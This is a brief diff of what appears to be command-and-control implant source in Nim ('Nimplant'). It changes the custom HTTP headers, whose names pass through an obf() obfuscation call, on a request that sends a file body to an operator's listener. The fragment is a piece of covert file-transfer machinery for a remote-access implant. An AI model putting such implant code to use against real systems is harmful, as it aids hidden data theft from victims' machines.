@@ -45,7 +45,8 @@ proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : strin
             Header(key: obf("Content-Encoding"), value: obf("gzip")),
             Header(key: obf("X-Identifier"), value: li.id), # Nimplant ID
             Header(key: obf("X-Unique-ID"), value: cmdGuid),  # Task GUID
-            Header(key: obf("X-Header"), value: li.customHeaderOne)
+            Header(key: obf("X-Header"), value: li.xHeader),
+            Header(key: obf("X-ID"), value: li.xID)
         ],
         body: file
     )
